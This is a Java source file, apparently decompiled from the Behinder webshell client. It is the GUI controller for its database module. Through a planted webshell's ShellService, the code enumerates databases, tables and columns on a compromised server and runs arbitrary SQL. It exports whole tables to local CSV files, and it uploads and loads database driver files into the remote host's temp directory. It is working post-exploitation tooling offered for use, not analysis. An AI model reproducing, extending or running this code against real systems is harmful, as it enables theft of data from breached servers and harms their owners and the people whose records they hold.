package net.rebeyond.behinder.ui.controller;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URI;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.beans.property.StringProperty;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.ComboBox;
import javafx.scene.control.ContextMenu;
import javafx.scene.control.Label;
import javafx.scene.control.MenuItem;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TablePosition;
import javafx.scene.control.TableView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.TreeItem;
import javafx.scene.control.TreeView;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.MouseButton;
import javafx.stage.FileChooser;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONArray;
import org.json.JSONObject;

public class DatabaseViewController {
   private ShellManager shellManager;
   @FXML
   private ComboBox databaseTypeCombo;
   @FXML
   private TextField connStrText;
   @FXML
   private TextArea sqlText;
   @FXML
   private TreeView schemaTree;
   @FXML
   private TableView dataTable;
   @FXML
   private Button connectBtn;
   @FXML
   private Button executeSqlBtn;
   private ShellService currentShellService;
   private JSONObject shellEntity;
   private List workList;
   private Label statusLabel;

   public void init(ShellService shellService, List workList, Label statusLabel) {
      this.currentShellService = shellService;
      this.shellEntity = shellService.getShellEntity();
      this.workList = workList;
      this.statusLabel = statusLabel;
      this.initDatabaseView();
   }

   private void initDatabaseView() {
      this.schemaTree.setOnMouseClicked((event) -> {
         TreeItem currentTreeItem = (TreeItem)this.schemaTree.getSelectionModel().getSelectedItem();
         if (currentTreeItem.isExpanded()) {
            currentTreeItem.setExpanded(false);
         } else if (event.getButton() == MouseButton.PRIMARY && !currentTreeItem.isExpanded()) {
            if (currentTreeItem.getGraphic().getUserData().toString().equals("database")) {
               try {
                  this.showTables(currentTreeItem);
               } catch (Exception var5) {
                  var5.printStackTrace();
               }
            } else if (currentTreeItem.getGraphic().getUserData().toString().equals("table")) {
               try {
                  this.showColumns(currentTreeItem);
               } catch (Exception var4) {
                  var4.printStackTrace();
               }
            }
         }

      });
      this.executeSqlBtn.setOnAction((event) -> {
         try {
            Map connParams = this.parseConnURI(this.connStrText.getText());
            Runnable runner = () -> {
               try {
                  String resultText = this.executeSQL(connParams, this.sqlText.getText());
                  Platform.runLater(() -> {
                     try {
                        this.fillTable(resultText);
                        this.statusLabel.setText("SQL执行成功。");
                     } catch (Exception var3) {
                        this.statusLabel.setText("SQL执行失败:" + var3.getMessage());
                     }

                  });
               } catch (Exception var3) {
                  Platform.runLater(() -> {
                     this.statusLabel.setText("SQL执行失败:" + var3.getMessage());
                  });
               }

            };
            Thread worker = new Thread(runner);
            this.workList.add(worker);
            worker.start();
         } catch (Exception var5) {
            this.statusLabel.setText(var5.getMessage());
         }

      });
      this.initDatabaseType();
      this.loadContextMenu();
   }

   private void loadContextMenu() {
      this.loadTreeContextMenu();
      this.loadTableContextMenu();
   }

   private void loadTreeContextMenu() {
      ContextMenu treeContextMenu = new ContextMenu();
      MenuItem queryHeadBtn = new MenuItem("查询前10条");
      treeContextMenu.getItems().add(queryHeadBtn);
      MenuItem queryAllBtn = new MenuItem("查询全部");
      treeContextMenu.getItems().add(queryAllBtn);
      MenuItem exportBtn = new MenuItem("导出当前表");
      treeContextMenu.getItems().add(exportBtn);
      queryHeadBtn.setOnAction((event) -> {
         TreeItem currentTreeItem = (TreeItem)this.schemaTree.getSelectionModel().getSelectedItem();
         String tableName = currentTreeItem.getValue().toString();
         String dataBaseName = currentTreeItem.getParent().getValue().toString();
         Runnable runner = () -> {
            try {
               Map connParams = this.parseConnURI(this.connStrText.getText());
               String databaseType = (String)connParams.get("type");
               String sql = null;
               if (databaseType.equals("mysql")) {
                  sql = String.format("select * from %s.%s limit 10", dataBaseName, tableName);
               } else if (databaseType.equals("sqlserver")) {
                  sql = String.format("select top 10 * from %s..%s", dataBaseName, tableName);
               } else if (databaseType.equals("oracle")) {
                  sql = String.format("select * from %s where rownum<=10", tableName);
               }

               String resultText = this.executeSQL(connParams, sql);
               Platform.runLater(() -> {
                  try {
                     this.fillTable(resultText);
                  } catch (Exception var3) {
                     this.statusLabel.setText(var3.getMessage());
                  }

               });
            } catch (Exception var7) {
               Platform.runLater(() -> {
                  this.statusLabel.setText(var7.getMessage());
               });
            }

         };
         Thread worker = new Thread(runner);
         this.workList.add(worker);
         worker.start();
      });
      queryAllBtn.setOnAction((event) -> {
         TreeItem currentTreeItem = (TreeItem)this.schemaTree.getSelectionModel().getSelectedItem();
         String tableName = currentTreeItem.getValue().toString();
         String dataBaseName = currentTreeItem.getParent().getValue().toString();
         Alert alert = new Alert(AlertType.CONFIRMATION);
         alert.setTitle("确认");
         alert.setHeaderText("");
         alert.setContentText("查询所有记录可能耗时较长，确定查询所有记录？");
         Optional result = alert.showAndWait();
         if (result.get() == ButtonType.OK) {
            Runnable runner = () -> {
               try {
                  Map connParams = this.parseConnURI(this.connStrText.getText());
                  String databaseType = (String)connParams.get("type");
                  String sql = null;
                  if (databaseType.equals("mysql")) {
                     sql = String.format("select * from %s.%s", dataBaseName, tableName);
                  } else if (databaseType.equals("sqlserver")) {
                     sql = String.format("select * from %s..%s", dataBaseName, tableName);
                  } else if (databaseType.equals("oracle")) {
                     sql = String.format("select * from %s", tableName);
                  }

                  String resultText = this.executeSQL(connParams, sql);
                  Platform.runLater(() -> {
                     try {
                        this.fillTable(resultText);
                     } catch (Exception var3) {
                        this.statusLabel.setText(var3.getMessage());
                     }

                  });
               } catch (Exception var7) {
                  Platform.runLater(() -> {
                     this.statusLabel.setText(var7.getMessage());
                  });
               }

            };
            Thread worker = new Thread(runner);
            this.workList.add(worker);
            worker.start();
         }

      });
      exportBtn.setOnAction((event) -> {
         TreeItem currentTreeItem = (TreeItem)this.schemaTree.getSelectionModel().getSelectedItem();
         String tableName = currentTreeItem.getValue().toString();
         String dataBaseName = currentTreeItem.getParent().getValue().toString();
         FileChooser fileChooser = new FileChooser();
         fileChooser.setTitle("请选择保存路径");
         fileChooser.setInitialFileName("export_table.csv");
         File selectedFile = fileChooser.showSaveDialog(this.schemaTree.getScene().getWindow());
         String selected = selectedFile.getAbsolutePath();
         if (selected != null && !selected.equals("")) {
            Runnable runner = () -> {
               try {
                  Map connParams = this.parseConnURI(this.connStrText.getText());
                  String databaseType = (String)connParams.get("type");
                  String sql = null;
                  if (databaseType.equals("mysql")) {
                     sql = String.format("select * from %s.%s", dataBaseName, tableName);
                  } else if (databaseType.equals("sqlserver")) {
                     sql = String.format("select * from %s..%s", dataBaseName, tableName);
                  } else if (databaseType.equals("oracle")) {
                     sql = String.format("select * from %s", tableName);
                  }

                  String resultText = this.executeSQL(connParams, sql);
                  StringBuilder rows = new StringBuilder();
                  JSONArray arr = new JSONArray(resultText);
                  String colsLine = "";
                  JSONArray cols = arr.getJSONArray(0);

                  int i;
                  for(i = 0; i < cols.length(); ++i) {
                     JSONObject colObj = cols.getJSONObject(i);
                     colsLine = colsLine + colObj.getString("name") + ",";
                  }

                  rows.append(colsLine + "\n");

                  for(i = 1; i < arr.length(); ++i) {
                     JSONArray cells = arr.getJSONArray(i);

                     for(int j = 0; j < cells.length(); ++j) {
                        rows.append(cells.get(j) + ",");
                     }

                     rows.append("\n");
                  }

                  FileOutputStream fso = new FileOutputStream(selected);
                  fso.write(rows.toString().getBytes());
                  fso.flush();
                  fso.close();
                  Platform.runLater(() -> {
                     this.statusLabel.setText("导出完成，文件已保存至" + selected);
                  });
               } catch (Exception var15) {
                  Platform.runLater(() -> {
                     this.statusLabel.setText(var15.getMessage());
                  });
                  var15.printStackTrace();
               }

            };
            Thread worker = new Thread(runner);
            this.workList.add(worker);
            worker.start();
         }
      });
      this.schemaTree.setOnContextMenuRequested((event) -> {
         TreeItem currentTreeItem = (TreeItem)this.schemaTree.getSelectionModel().getSelectedItem();
         if (currentTreeItem.getGraphic().getUserData().toString().equals("table")) {
            treeContextMenu.show(this.schemaTree.getScene().getWindow(), event.getScreenX(), event.getScreenY());
         }

      });
   }

   private void loadTableContextMenu() {
      ContextMenu tableContextMenu = new ContextMenu();
      MenuItem copyCellBtn = new MenuItem("复制单元格");
      tableContextMenu.getItems().add(copyCellBtn);
      MenuItem copyRowBtn = new MenuItem("复制整行");
      tableContextMenu.getItems().add(copyRowBtn);
      MenuItem exportBtn = new MenuItem("导出全部查询结果");
      tableContextMenu.getItems().add(exportBtn);
      copyCellBtn.setOnAction((event) -> {
         TablePosition position = (TablePosition)this.dataTable.getSelectionModel().getSelectedCells().get(0);
         int row = position.getRow();
         int column = position.getColumn();
         String selectedValue = "";
         if (this.dataTable.getItems().size() > row && ((List)this.dataTable.getItems().get(row)).size() > column) {
            selectedValue = ((StringProperty)((List)this.dataTable.getItems().get(row)).get(column)).getValue();
            Utils.setClipboardString(selectedValue);
         }

      });
      copyRowBtn.setOnAction((event) -> {
         TablePosition position = (TablePosition)this.dataTable.getSelectionModel().getSelectedCells().get(0);
         int row = position.getRow();
         int column = position.getColumn();
         String selectedValue = "";
         int rowSize = this.dataTable.getItems().size();
         int columnSize = ((List)this.dataTable.getItems().get(row)).size();
         if (rowSize > row && columnSize > column) {
            String lineContent = "";

            for(int i = 0; i < columnSize; ++i) {
               selectedValue = ((StringProperty)((List)this.dataTable.getItems().get(row)).get(i)).getValue();
               lineContent = lineContent + selectedValue + "|";
            }

            Utils.setClipboardString(lineContent);
         }

      });
      exportBtn.setOnAction((event) -> {
         FileChooser fileChooser = new FileChooser();
         fileChooser.setTitle("请选择保存路径");
         fileChooser.setInitialFileName("export_table.csv");
         File selectedFile = fileChooser.showSaveDialog(this.schemaTree.getScene().getWindow());
         String selected = selectedFile.getAbsolutePath();
         if (selected != null && !selected.equals("")) {
            int rowSize = this.dataTable.getItems().size();
            int columnSize = ((List)this.dataTable.getItems().get(0)).size();
            this.statusLabel.setText("正在准备数据……");
            Runnable runner = () -> {
               StringBuilder sb = new StringBuilder();

               int i;
               for(i = 0; i < columnSize; ++i) {
                  TableColumn col = (TableColumn)this.dataTable.getColumns().get(i);
                  sb.append(col.getText() + ",");
               }

               sb.append("\n");

               for(i = 0; i < rowSize; ++i) {
                  for(int j = 0; j < columnSize; ++j) {
                     String cellString = ((StringProperty)((List)this.dataTable.getItems().get(i)).get(j)).getValue();
                     sb.append(cellString + ",");
                  }

                  sb.append("\n");
               }

               Platform.runLater(() -> {
                  this.statusLabel.setText("正在写入文件……" + selected);
               });

               try {
                  FileOutputStream fso = new FileOutputStream(selected);
                  fso.write(sb.toString().getBytes());
                  fso.flush();
                  fso.close();
                  Platform.runLater(() -> {
                     this.statusLabel.setText("导出完成，文件已保存至" + selected);
                  });
               } catch (Exception var8) {
                  var8.printStackTrace();
                  Platform.runLater(() -> {
                     this.statusLabel.setText("导出失败:" + var8.getMessage());
                  });
               }

            };
            Thread worker = new Thread(runner);
            this.workList.add(worker);
            worker.start();
         }
      });
      this.dataTable.setContextMenu(tableContextMenu);
   }

   private void initDatabaseType() {
      ObservableList typeList = FXCollections.observableArrayList(new String[]{"MySQL", "SQLServer", "Oracle"});
      this.databaseTypeCombo.setItems(typeList);
      this.databaseTypeCombo.setOnAction((event) -> {
         String type = this.databaseTypeCombo.getValue().toString();
         String connStr = this.formatConnectString(type);
         this.connStrText.setText(connStr);
      });
      this.connectBtn.setOnAction((event) -> {
         try {
            this.showDatabases(this.connStrText.getText());
         } catch (Exception var3) {
            var3.printStackTrace();
            this.statusLabel.setText("连接失败:" + var3.getMessage());
         }

      });
   }

   private String formatConnectString(String type) {
      String result = "%s://%s:password@127.0.0.1:%s/%s";
      byte var4 = -1;
      switch(type.hashCode()) {
      case -1924994658:
         if (type.equals("Oracle")) {
            var4 = 2;
         }
         break;
      case 74798178:
         if (type.equals("MySQL")) {
            var4 = 0;
         }
         break;
      case 942662289:
         if (type.equals("SQLServer")) {
            var4 = 1;
         }
      }

      switch(var4) {
      case 0:
         result = String.format(result, "mysql", "root", "3306", "mysql");
         break;
      case 1:
         result = String.format(result, "sqlserver", "sa", "1433", "master");
         break;
      case 2:
         result = String.format(result, "oracle", "sys", "1521", "orcl");
      }

      return result;
   }

   private void showTables(TreeItem currentTreeItem) throws Exception {
      Map connParams = this.parseConnURI(this.connStrText.getText());
      String sql = null;
      String databaseName = currentTreeItem.getValue().toString();
      String databaseType = (String)connParams.get("type");
      if (databaseType.equals("mysql")) {
         sql = String.format("select table_name,a.* from information_schema.tables as a where table_schema='%s' and table_type='base table'", databaseName);
      } else if (databaseType.equals("sqlserver")) {
         sql = String.format("select name,* from %s..sysobjects  where xtype='U'", databaseName);
      } else if (databaseType.equals("oracle")) {
         sql = "select table_name,num_rows from user_tables";
      }

      final String finalSql = sql;
      Runnable runner = () -> {
         try {
            String resultText = this.executeSQL(connParams, finalSql);
            Platform.runLater(() -> {
               try {
                  this.fillTable(resultText);
                  this.fillTree(resultText, currentTreeItem);
               } catch (Exception var4) {
                  this.statusLabel.setText(var4.getMessage());
               }

            });
         } catch (Exception var5) {
            this.statusLabel.setText(var5.getMessage());
         }

      };
      Thread worker = new Thread(runner);
      this.workList.add(worker);
      worker.start();
   }

   private void showColumns(TreeItem currentTreeItem) {
      try {
         String tableName = currentTreeItem.getValue().toString();
         String databaseName = currentTreeItem.getParent().getValue().toString();
         Map connParams = this.parseConnURI(this.connStrText.getText());
         String sql = null;
         String databaseType = (String)connParams.get("type");
         if (databaseType.equals("mysql")) {
            sql = String.format("select COLUMN_NAME,a.* from information_schema.columns as a where table_schema='%s' and table_name='%s'", databaseName, tableName);
         } else if (databaseType.equals("sqlserver")) {
            sql = String.format("SELECT Name,* FROM %s..SysColumns WHERE id=Object_Id('%s')", databaseName, tableName);
         } else if (databaseType.equals("oracle")) {
            sql = String.format("select COLUMN_NAME,a.* from user_tab_columns a where Table_Name='%s' ", tableName);
         }

         String resultText = this.executeSQL(connParams, sql);
         this.fillTable(resultText);
         this.fillTree(resultText, currentTreeItem);
      } catch (Exception var8) {
         this.statusLabel.setText(var8.getMessage());
      }

   }

   private void showDatabases(String connString) throws Exception {
      TreeItem rootItem = new TreeItem("数据库列表", new ImageView());
      rootItem.getGraphic().setUserData("root");
      this.schemaTree.setRoot(rootItem);
      this.schemaTree.setShowRoot(false);
      String shellType = this.currentShellService.getShellEntity().getString("type");
      Map connParams = this.parseConnURI(connString);
      String databaseType = ((String)connParams.get("type")).toLowerCase();
      String sql = null;
      if (databaseType.equals("mysql")) {
         sql = "show databases";
      } else if (databaseType.equals("sqlserver")) {
         sql = "SELECT name FROM  master..sysdatabases";
      } else if (databaseType.equals("oracle")) {
         sql = "select sys_context('userenv','db_name') as db_name from dual";
      }

      final String finalSql = sql;
      Runnable runner = () -> {
         try {
            if (shellType.equals("aspx")) {
               this.loadDriver("aspx", "mysql");
               this.loadDriver("aspx", "oracle");
            }

            String resultText = this.executeSQL(connParams, finalSql);
            if (resultText.equals("NoDriver")) {
               this.loadDriver(shellType, (String)connParams.get("type"));
               return;
            }

            Platform.runLater(() -> {
               try {
                  this.fillTable(resultText);
                  this.fillTree(resultText, rootItem);
               } catch (Exception var4) {
                  var4.printStackTrace();
                  this.statusLabel.setText(var4.getMessage());
               }

            });
         } catch (Exception var6) {
            var6.printStackTrace();
            Platform.runLater(() -> {
               this.statusLabel.setText(var6.getMessage());
            });
         }

      };
      Thread worker = new Thread(runner);
      this.workList.add(worker);
      worker.start();
   }

   private Map parseConnURI(String url) throws Exception {
      Map connParams = new HashMap();
      URI connUrl = new URI(url);
      String type = connUrl.getScheme();
      String host = connUrl.getHost();
      String port = connUrl.getPort() + "";
      String authority = connUrl.getUserInfo();
      String user = authority.substring(0, authority.indexOf(":"));
      String pass = authority.substring(authority.indexOf(":") + 1);
      String database = connUrl.getPath().replaceFirst("/", "");
      String coding = "UTF-8";
      if (connUrl.getQuery() != null && connUrl.getQuery().indexOf("coding=") >= 0) {
         coding = connUrl.getQuery();
         Pattern p = Pattern.compile("([a-zA-Z]*)=([a-zA-Z0-9\\-]*)");
         Matcher m = p.matcher(connUrl.getQuery());

         while(m.find()) {
            String key = m.group(1).toLowerCase();
            if (key.equals("coding")) {
               coding = m.group(2).trim();
            }
         }
      }

      connParams.put("type", type);
      connParams.put("host", host);
      connParams.put("port", port);
      connParams.put("user", user);
      connParams.put("pass", pass);
      connParams.put("database", database);
      connParams.put("coding", coding);
      return connParams;
   }

   private void loadDriver(String scriptType, String databaseType) throws Exception {
      String driverPath = "net/rebeyond/behinder/resource/driver/";
      Platform.runLater(() -> {
         this.statusLabel.setText("正在上传数据库驱动……");
      });
      String os = this.currentShellService.shellEntity.getString("os").toLowerCase();
      String remoteDir = os.indexOf("windows") >= 0 ? "c:/windows/temp/" : "/tmp/";
      String libName = null;
      if (scriptType.equals("jsp")) {
         if (databaseType.equals("sqlserver")) {
            libName = "sqljdbc41.jar";
         } else if (databaseType.equals("mysql")) {
            libName = "mysql-connector-java-5.1.36.jar";
         } else if (databaseType.equals("oracle")) {
            libName = "ojdbc5.jar";
         }
      } else if (scriptType.equals("aspx")) {
         if (databaseType.equals("mysql")) {
            libName = "mysql.data.dll";
         } else if (databaseType.equals("oracle")) {
            libName = "Oracle.ManagedDataAccess.dll";
         }
      }

      byte[] driverFileContent = Utils.getResourceData(driverPath + libName);
      String remotePath = remoteDir + libName;
      this.currentShellService.uploadFile(remotePath, driverFileContent, true);
      Platform.runLater(() -> {
         this.statusLabel.setText("驱动上传成功，正在加载驱动……");
      });
      JSONObject loadRes = this.currentShellService.loadJar(remotePath);
      if (loadRes.getString("status").equals("fail")) {
         throw new Exception("驱动加载失败:" + loadRes.getString("msg"));
      } else {
         Platform.runLater(() -> {
            if (scriptType.equals("jsp")) {
               this.statusLabel.setText("驱动加载成功，请再次点击“连接”。");
            }

            this.statusLabel.setText("驱动加载成功。");
         });
      }
   }

   private String executeSQL(Map connParams, String sql) throws Exception {
      Platform.runLater(() -> {
         this.statusLabel.setText("正在查询，请稍后……");
         this.sqlText.setText(sql);
      });
      String type = (String)connParams.get("type");
      String host = (String)connParams.get("host");
      String port = (String)connParams.get("port");
      String user = (String)connParams.get("user");
      String pass = (String)connParams.get("pass");
      String database = (String)connParams.get("database");
      JSONObject resultObj = this.currentShellService.execSQL(type, host, port, user, pass, database, sql);
      String status = resultObj.getString("status");
      String msg = resultObj.getString("msg");
      Platform.runLater(() -> {
         if (status.equals("success")) {
            this.statusLabel.setText("查询完成。");
         } else if (status.equals("fail") && !msg.equals("NoDriver")) {
            this.statusLabel.setText("查询失败:" + msg);
         }

      });
      return msg;
   }

   private void fillTree(String resultText, TreeItem currentTreeItem) throws Exception {
      currentTreeItem.getChildren().clear();
      JSONArray result = new JSONArray(resultText);
      int childNums = result.length() - 1;
      String childIconPath = "";
      String childType = "";
      String var7 = currentTreeItem.getGraphic().getUserData().toString();
      byte var8 = -1;
      switch(var7.hashCode()) {
      case 3506402:
         if (var7.equals("root")) {
            var8 = 0;
         }
         break;
      case 110115790:
         if (var7.equals("table")) {
            var8 = 2;
         }
         break;
      case 1789464955:
         if (var7.equals("database")) {
            var8 = 1;
         }
      }

      switch(var8) {
      case 0:
         childIconPath = "net/rebeyond/behinder/resource/database.png";
         childType = "database";
         break;
      case 1:
         childIconPath = "net/rebeyond/behinder/resource/database_table.png";
         childType = "table";
         break;
      case 2:
         childIconPath = "net/rebeyond/behinder/resource/database_column.png";
         childType = "column";
      }

      Image icon = new Image(new ByteArrayInputStream(Utils.getResourceData(childIconPath)));

      for(int i = 1; i <= childNums; ++i) {
         JSONArray row = result.getJSONArray(i);
         String childName = row.get(0).toString();
         TreeItem treeItem = new TreeItem(childName, new ImageView(icon));
         treeItem.getGraphic().setUserData(childType);
         treeItem.setValue(childName);
         currentTreeItem.getChildren().add(treeItem);
      }

      currentTreeItem.setExpanded(true);
   }

   private void fillTable(String resultText) throws Exception {
      JSONArray result;
      try {
         result = new JSONArray(resultText);
      } catch (Exception var11) {
         throw new Exception(resultText);
      }

      if (result.get(0).getClass().toString().equals("class org.json.JSONArray")) {
         JSONArray fieldArray = result.getJSONArray(0);
         int rows = result.length() - 1;
         ObservableList tableViewColumns = FXCollections.observableArrayList();

         for(int i = 0; i < fieldArray.length(); ++i) {
            JSONObject field = fieldArray.getJSONObject(i);
            String fieldName = field.get("name").toString();
            TableColumn col = new TableColumn(fieldName);
            tableViewColumns.add(col);
            final int finali = i;
            col.setCellValueFactory((datax) -> {
               //return (StringProperty)((List)datax.getValue()).get(i);
               return (StringProperty)((List)((TableColumn.CellDataFeatures)datax).getValue()).get(finali);
            });
         }

         this.dataTable.getColumns().setAll(tableViewColumns);
         ObservableList data = FXCollections.observableArrayList();

         for(int i = 1; i < rows; ++i) {
            JSONArray rowArr = result.getJSONArray(i);
            List row = new ArrayList();

            for(int j = 0; j < rowArr.length(); ++j) {
               row.add(j, new SimpleStringProperty(rowArr.get(j).toString()));
            }

            data.add(row);
         }

         this.dataTable.setItems(data);
      }
   }
}
